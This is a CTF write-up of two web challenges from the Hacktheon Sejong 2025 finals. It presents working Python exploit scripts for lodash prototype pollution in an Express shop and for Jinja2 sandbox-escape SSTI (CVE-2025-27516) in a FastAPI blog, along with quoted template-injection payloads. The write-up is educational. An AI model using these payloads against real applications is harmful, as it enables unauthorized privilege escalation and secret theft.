---
title: Hacktheon Sejong 2025 Finals
published: 2025-07-15
description: 'Write-up for 2 white-box web challenge in HackTheon Finals'
image: ''
tags: [web, ctf]
category: 'write-up'
draft: false 
lang: 'en'
---

## Overview

This write-up is for two white-box web challenges from the finals of Hacktheon Sejong 2025: **Shop Prototype** and **Blog**. Here is the link to source code of them.
::github{repo="VuxNx/Hacktheon_Sejong_2025_Final"}
I'll go through each of them in detail, one by one. So now, let's start with **Shop Prototype**

## Shop Prototype

### Challenge Overview
This is an Express.js-based web application simulating a prototype e-commerce site with login, registration, session handling, and a payment system.

### Code Audit

This is ```app/index.js``` :

```js
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const _ = require('lodash'); 
const port = 3000;
const db = require('./db');
const bcrypt = require('bcryptjs');
const session = require('express-session');
const { sanitize } = require('./utils/sanitizer')
app.use(express.static('public'));
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: true,
}));

let flag = process.env.FLAG;

function createUserContext(data) {
  const baseUser = {}
  const user = Object.create(baseUser);
  user.id = data.id;
  user.username = data.username;
  user.points = data.points;
  user.purchased = [];
  return user;
}

app.use((err, req, res, next) => {
  console.error('Unhandled error:', err.stack);
  res.status(500).send("Something went wrong. Please try again later.");
});

app.get('/', (req, res) => {
  res.send('Welcome to the Prototype Shop!');
});

function requireLogin(req, res, next) {
  if (!req.session.userId) return res.status(401).send("Login required");
  next();
}

app.post('/auth/logout', requireLogin, (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).send("Could not log out");
    }
    res.clearCookie('connect.sid');
    res.send("Logout successful!");
  });
});

app.get('/auth/register', (req, res) => {
  res.send('Register page');
});

app.post('/auth/register', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).send("Missing fields");
  
  const [exists] = await db.execute('SELECT * FROM users WHERE username = ?', [username]);
  if (exists.length > 0) return res.status(400).send("User already exists");

  const hashedPassword = await bcrypt.hash(password, 10);
  await db.execute('INSERT INTO users (username, password) VALUES (?, ?)', [username, hashedPassword]);

  res.send("User registered successfully!");
});

app.get('/auth/login', (req, res) => {
  res.send('Login page');
});

app.post('/auth/login', async (req, res) => {
  const { username, password } = req.body;
  const [rows] = await db.execute('SELECT * FROM users WHERE username = ?', [username]);
  if (rows.length === 0) return res.status(400).send("Invalid username or password");

  const userRow = rows[0];
  const isValidPassword = await bcrypt.compare(password, userRow.password);
  if (!isValidPassword) return res.status(400).send("Invalid username or password");

  req.session.userId = userRow.id;
  req.session.user = createUserContext(userRow);
  res.send("Login successful!");

})

app.get('/products', requireLogin, async (req, res) => {
  const [products] = await db.execute('SELECT * FROM products'); 
  res.json(products);
});

app.get('/me', requireLogin, async (req, res) => {
  const user = req.session.user;
  
  res.json({
    id: user.id,
    username: user.username,
    points: user.points,
    verified: user.verified,
    status: user.state,
    purchased: user.purchased
  });
});

app.post('/payment/init', requireLogin, async (req, res) => {
  const [rows] = await db.execute('SELECT * FROM users WHERE id = ?', [req.session.userId]);
  if (rows.length === 0) return res.status(404).send("User not found");

  const user = req.session.user;

  const forbiddenKeys = ['verified', 'status'];
  for (const key of forbiddenKeys) {
    if (key in req.body) {
      return res.status(400).send("[✖] You cannot modify this field. : {" + key + "}");
    }
  }

  const cleanBody = sanitize(req.body)
  _.merge(user, cleanBody);
  res.send("[✔] Info merged for payment.");
});


app.get('/payment/confirm', requireLogin, async (req, res) => {
  const user = req.session.user;
  if (!user || !user.productId) return res.status(400).send("Missing payment info.");

  const [products] = await db.execute('SELECT * FROM products WHERE id = ?', [user.productId]);
  if (products.length === 0) return res.status(404).send("Product not found");

  const product = products[0];

  const user_points = user.points;
  if (user_points < product.price) {
    return res.status(400).send("Not enough points.");
  }

  if (user.verified === true && user.state === 'paid' ) {
    await db.execute('UPDATE users SET points = points - ? WHERE id = ?', [product.price, user.id]);
    await db.execute('INSERT INTO purchases (user_id, product_id) VALUES (?, ?)', [user.id, product.id]);
    return res.send("🎉 Congratulations! " + flag);
  }
  return res.status(403).send("Prototype Shop: You’ve reached the limits of this early-stage system. No real purchases can be made.");
});

app.listen(port, () => {
  console.log(`SSPP true-prototype challenge running on http://localhost:${port}`);
});
```
As we can see, above code has features below:

1. **User Authentication**

    1.1. **Registration** (`POST /auth/register`)

    - Accepts `username` and `password` from the request body.  
    - Checks if the user already exists in the database.  
    - Hashes the password using `bcryptjs`.  
    - Stores the new user in the `users` table.

    1.2. **Login** (`POST /auth/login`)

    - Retrieves the user by `username`.
    - Compares the provided password with the stored hash.
    - If valid, stores the user ID and a simplified user context in the session.

    1.3. **Logout** (`POST /auth/logout`)

    - Destroys the user session and clears the session cookie.
2. **Session Management**
- Uses `express-session` to manage user sessions.
- User session stores:
  - `id`
  - `username`
  - `points`
  - `purchased` (empty array by default)
- `createUserContext()` initializes the user object stored in the session.
- Session user data is later used for authorization and logic checks.

3. **Product Viewing**
    
    3.1. **List Products** (`GET /products`)

    - Requires login.
    - Queries and returns all available products from the database.

4. **User Information**

    4.1. **View Profile** (`GET /me`)

    - Requires login.
    - Returns current session user's data:
        - `id`
        - `username`
        - `points`
        - `verified` (if exists)
        - `status` (`state`)
        - `purchased`

5. **Payment Logic**

    5.1. **Initialize Payment** (`POST /payment/init`)
    - Requires login.
    - Accepts user input and merges it into the session user object using `_.merge`.
    - Blocks direct updates to `verified` and `status` keys.
    - Sanitizes input using `sanitize()` from `./utils/sanitizer`.
    - All other fields can be merged freely.

    5.2. **Confirm Payment** (`GET /payment/confirm`)
    - Requires login.
    - Verifies:
        - `productId` exists in session user object.
        - The product exists in the database.
        - User has enough points.
        - User is both `verified === true` and `state === 'paid'`.

    If all checks pass:
    - Deducts the product price from the user's points.
    - Records the purchase in the `purchases` table.
    - Reveals the flag.

    Otherwise:
    - Returns an appropriate error message.

Follow the source and sink, we only focus on this logic:

```js
if (user.verified === true && user.state === 'paid' ) {
    await db.execute('UPDATE users SET points = points - ? WHERE id = ?', [product.price, user.id]);
    await db.execute('INSERT INTO purchases (user_id, product_id) VALUES (?, ?)', [user.id, product.id]);
    return res.send("🎉 Congratulations! " + flag);
}
```
So, as I mentioned above, to get the flag, we need to meet two conditions: `verified === true` and `state === 'paid'`. Upon closer inspection, we can see a typical prototype pollution vulnerability in the `/payment/init` route due to the use of `_.merge` (the `lodash` version 4.17.1 is vulnerable to prototype pollution). So keep analysis the route ```/payment/init```:
```js
app.post('/payment/init', requireLogin, async (req, res) => {
  const [rows] = await db.execute('SELECT * FROM users WHERE id = ?', [req.session.userId]);
  if (rows.length === 0) return res.status(404).send("User not found");

  const user = req.session.user;

  const forbiddenKeys = ['verified', 'status'];
  for (const key of forbiddenKeys) {
    if (key in req.body) {
      return res.status(400).send("[✖] You cannot modify this field. : {" + key + "}");
    }
  }

  const cleanBody = sanitize(req.body)
  _.merge(user, cleanBody);
  res.send("[✔] Info merged for payment.");
});
```

---

#### WAFs in Place

Before the merge occurs, the code implements two filtering mechanisms (WAF-like logic):

#### 1. `forbiddenKeys` Blacklist

```js
const forbiddenKeys = ['verified', 'status'];
...
for (const key of forbiddenKeys) {
  if (key in req.body) {
    return res.status(400).send("[✖] You cannot modify this field. : {" + key + "}");
  }
}
```

This only checks **top-level** keys of `req.body`. As a result, the following payload is **not blocked**:

```json
{
  "__proto__": {
    "verified": true,
    "state": "paid"
  }
}
```

This is because `"verified"` is **not** a direct key of the request body.

 **Bypass confirmed.**

---

#### 2. `sanitize()` Function

The app then sanitizes the input before merging:

```js
const cleanBody = sanitize(req.body)
_.merge(user, cleanBody);
```

The `sanitize()` function is meant to recursively filter out **dangerous keys**, such as:

```js
const dangerousKeys = [
  'constructor',
  'prototype',
  '__defineGetter__',
  'eval',
  'settings',
  ...
];
```

However, **`__proto__` is NOT included** in this list.

This is a critical mistake — `__proto__` is a well-known vector for **prototype pollution** and should have been filtered.

**Bypass confirmed.**

---
### PoC

Combine all thing, we come to this PoC code:

```python
import requests

BASE_URL = "http://hacktheon2025-challs-alb-1807358214.ap-northeast-2.elb.amazonaws.com:3000"
USERNAME = "c"
PASSWORD = "c"

session = requests.Session()

register_data = {"username": USERNAME, "password": PASSWORD}
response = session.post(f"{BASE_URL}/auth/register", json=register_data)
print("Register:", response.text)

login_data = {"username": USERNAME, "password": PASSWORD}
response = session.post(f"{BASE_URL}/auth/login", json=login_data)
print("Login:", response.text)

if "Login successful" not in response.text:
    print("Login failed. Exiting.")
    exit()

response = session.get(f"{BASE_URL}/products")
print("Raw response:", response.text)  

try:
    products = response.json()
except Exception as e:
    print("Failed to parse products JSON:", e)
    exit()

if not products:
    print("No products found.")
    exit()

product_id = products[0]["id"]
product_price = products[0]["price"]
print(f"Target Product: ID={product_id}, Price={product_price}")

payload = {
    "productId": product_id,
    "points": product_price + 100,
    "__proto__": {
        "verified": True,
        "state": "paid"
    }
}
response = session.post(f"{BASE_URL}/payment/init", json=payload)
print("Exploit Payload Sent:", response.text)

response = session.get(f"{BASE_URL}/payment/confirm")
print("Flag:", response.text)
```

---

### Why This Works

- `_.merge()` is known to be vulnerable to **prototype pollution** if `__proto__` or `constructor.prototype` is present.
- When `user` is created with `Object.create(baseUser)`, its prototype chain is live.
- Merging into `__proto__` sets properties on the prototype of **all objects** in the app — including the `user` object from the session.
- As a result, `user.verified` and `user.state` become `'true'` and `'paid'`, satisfying the condition in `/payment/confirm`.

---

## Blog

### Challenge Overview

This FastAPI-based blogging platform enables users to register, log in using JWT authentication, create blog posts, and subscribe to other users. It supports email notifications for new posts and subscriptions using templated emails. The application is modular, with separate components for routing, data access, and utility functions. Configuration is managed through environment variables and secret files, and the system is structured around clearly defined data models for users, posts, and tokens. 

### Code Audit

Because the source code for this challenge is quite large, in this blog, I cannot go through it in detail, one section at a time. I’ll provide the exact snippet that contains the core bug of the challenge.


```python
{% raw %} 

def render_template(template: str, **context):
    with open(os.path.join("templates", template)) as f:
        template = f.read()

    for key, value in context.items():
        template = template.replace(f"{{{{ {key} }}}}", value)

    return SandboxedEnvironment().from_string(template).render(**context)
{% endraw %}
```

The clearly bug that we can see that is SSTI at ```{% raw %}template = template.replace(f"{{{{ {key} }}}}", value){% endraw %}```. But there is a problem, this snippet render template use ```SandboxedEnvironment()```, which prevents many dangerous behaviors. Specifically, SandboxedEnvironment restricts access to Python's built-in functions, object internals like ```__class__```, and modules like os or subprocess, effectively mitigating most template-based code execution attacks. This means that even if an attacker injects malicious template expressions like `{% raw %}{{ config.__class__ }}{% endraw %}` or `{% raw %}{{ cycler.__init__.__globals__.os.system('...') }}{% endraw %}`, the sandbox will block them.

But wait, quick look at ```pyproject.toml```:

```python
[project]
name = "blog"
version = "0.1.0"
description = ""
requires-python = ">=3.13"
dependencies = [
    "aiosmtplib>=4.0.0",
    "fastapi[standard]>=0.115.12",
    "jinja2==3.1.5",
    "python-dotenv>=1.1.0",
    "python-jose[cryptography]>=3.4.0",
]
```


This project use `jinja2 v3.1.5`, try google this, we meet the CVE-2025-27516:

```
An oversight in how the Jinja sandboxed environment interacts with the |attr filter allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja's sandbox does catch calls to str.format and ensures they don't escape the sandbox. However, it's possible to use the |attr filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the |attr filter no longer bypasses the environment's attribute lookup.
```


Follow this [Github commit](https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403), we get:

![Screenshot](./commit.png)

I'll explain the testcase used in this commit:

```python 
t = env.from_string(
  """{{ "{0.__call__.__builtins__[__import__]}"
      | attr("format")(not_here) }}"""
  )
```

1. The string inside `{% raw %}{{...}}{% endraw %}`:

    ```python
    
    "{0.__call__.__builtins__[__import__]}"

    ```

    This is a string literal — it’s not executed yet. It contains a format string with dangerous internals.

    What does it mean?
    - Start with an object `(0)` — just a dummy input.
    - Access `.__call__`: For an integer, this doesn’t exist, but the idea is to trick the engine when the string is dynamically evaluated.
    - Then access `.__builtins__`: In many Python objects (especially functions), you can reach `__builtins__`, which gives access to all built-in functions (`open`, `eval`, `__import__`, etc.).
    - Then use `[...]`: dictionary-style access to built-ins, here grabbing `__import__`.

    This is a format string waiting to be `.format()`-ed to get resolved.

2. `| attr("format")`

    This is a Jinja2 filter that dynamically grabs the `.format` method from the string object.

    So now, you're essentially doing:

    ```python
    "{dangerous_stuff}".format(not_here)
    ```

    If `not_here` is an object (provided in context), this could resolve to `__import__` or even worse — arbitrary code execution.

3. `.format(not_here)`

    It tries to evaluate:

    ```python
    "{0.__call__.__builtins__[__import__]}".format(not_here)
    ```

    Which becomes:

    ```python
    not_here.__call__.__builtins__[__import__]
    ```

At this time, we can exploit this bug by replace ```not_here``` by ```self```, and then do the same thing with a normal SSTI. But now, we come to a new problem, you can not call function directly in this template, it will raise the exception:

```
ValueError: Only '.' or '[' may follow ']' in formal field specifier
```

At first, I couldn't think outside the box and kept trying to find a way to call a function, but I wasn't successful. But, I realized that, I didn't need to read ```secret.py```, I only need ```ADMIN_USER_ID```. So now, we can approach by class hierarchy and then access the attribute ```ADMIN_USER_ID``` of module ```secret```

---
### PoC

Nah, we got a simple PoC for this challenge:

```python

import requests

url = "http://localhost:8888/posts"
headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYmY5NmE0MDgtYzg0OC00NmY2LThhMWMtODA1MDJjOWVhZDE4IiwidXNlcm5hbWUiOiJ0ZXN0dXNlciIsImlzX2FkbWluIjpmYWxzZSwiZW1haWwiOiJ4QGV4YW1wbGUuY29tIn0.9y0ikwQNTnP2RkE2qS-FNWF2Z9Iu5o_OXi6Tw2r8yCI",
    "Content-Type": "application/json"
}

jinja_payload = '''{{ '{0.__init__.__globals__[sys].modules[src.secret].ADMIN_USER_ID}' | attr('format')(self) }}'''

data = {
    "title": "read main.py",
    "content": jinja_payload
}

response = requests.post(url, headers=headers, json=data)
print("Status Code:", response.status_code)
print("Response:", response.text)
```


